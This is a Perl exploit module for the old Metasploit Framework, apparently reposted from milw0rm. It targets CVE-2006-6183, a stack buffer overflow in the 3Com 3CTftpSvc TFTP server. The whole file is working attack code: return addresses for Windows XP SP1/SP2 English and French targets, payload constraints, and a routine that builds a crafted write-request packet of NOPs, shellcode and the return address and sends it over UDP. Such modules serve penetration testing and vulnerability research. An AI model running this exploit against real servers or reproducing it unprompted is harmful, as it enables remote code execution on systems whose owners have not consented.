package Msf::Exploit::3com_tftp_long_mode;

use strict;
use base \"Msf::Exploit\";
use Pex::Text;
use IO::Socket;

my $advanced = 
  {
  };

my $info =
  {
	\'Name\'           => \'TFTP Server 3CTftpSvc Buffer Overflow Vulnerability\',
	\'Version\'        => \'$ 1.0 $\',
	\'Authors\'        => [\'Enseirb <vincenty [at] enseirb.fr>\', ],
	\'Description\'    =>
	  Pex::Text::Freeform(qq{
		This vulnerability is caused due to a boundary error during the processing of TFTP Read/Write request packet types. This can be exploited to cause a stack-based buffer overflow by sending a specially crafted packet with an overly long mode field (more than 460 bytes).
                            }),

	\'Arch\'           => [ \'x86\' ],
	\'OS\'             => [ \'win32\' ],
	\'Priv\'           => 0,

	\'AutoOpts\'       => { \'EXITFUNC\' => \'seh\' },
	\'UserOpts\'       =>
	  {
		\'RHOST\'  => [ 1, \'ADDR\', \'The TFTP target adress\', \"127.0.0.1\" ],
		\'RPORT\'  => [ 0, \'PORT\', \'The TFTP target port\', 69 ],
	  },	

	\'Payload\'        =>
	  {
		\'Space\'    => 344,
		\'BadChars\' => \"\\x00\",
	  },

	\'Refs\'           =>
	  [
		[\'URL\', \'http://www.securityfocus.com/bid/21301\'],
		[\'CVE\', \'2006-6183\'],
		[\'URL\', \'http://secunia.com/advisories/23113\'],
		[\'URL\', \'http://www.securityfocus.com/archive/1/452754\'],		
	  ],

	\'DefaultTarget\'  => 0,
	\'Targets\'        =>
	  [
		[ \'0 - Windows XP SP2 ENG\', 0x77d4e23b ], #or 0x77bc2063
	        [ \'1 - Windows XP SP1 FR\', 0x77d8117b ],
	        [ \'2 - Windows XP SP2 FR\', 0x77d8d9af ],
	  ],

	\'Keys\'           => [ \'3com\' ],

	\'DisclosureDate\' => \'Nov 27 2006\',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({\'Info\' => $info, \'Advanced\' => $advanced}, @_);
	return($self);
}

sub Exploit 
{
    my $self = shift;
    my $target_idx  = $self->GetVar(\'TARGET\');
    my $target_host = $self->GetVar(\'RHOST\');
    my $target_port = $self->GetVar(\'RPORT\');
    my $shellcode = $self->GetVar(\'EncodedPayload\')->Payload;
    my $target = $self->Targets->[$target_idx];

    my $buff = \"\\x00\\x02\"; # for a WRQ (WriteReQuest) (or \"\\x00\\x01\" for a RRQ)
    $buff .= \"filename_string\";
    $buff .= \"\\x00\";
    $buff .= $self->MakeNops(129) . $shellcode; 
    $buff .= pack(\'V\',$target->[1]);
    $buff .= \"\\x00\";

    $self->PrintLine(\'[+] Try to connect... \' . $target_host . \':\' . $target_port);

    my $s = Msf::Socket::Udp->new
	(
	 \'PeerAddr\'  => $target_host,
	 \'PeerPort\'  => $target_port,	 
	);
    
    if ($s->IsError) {
	$self->PrintLine(\'[-] Error creating socket: \' . $s->GetError);
	return;
    }
 
    $self->PrintLine(\'[+] Connected!\');
    $self->PrintLine(\'[+] Sending exploit...\');

    $s->Send($buff);
    $self->PrintLine(\'[+] Exploit sent!\');
    $s->Close();

    return;
}

1;

# milw0rm.com [2007-01-21]
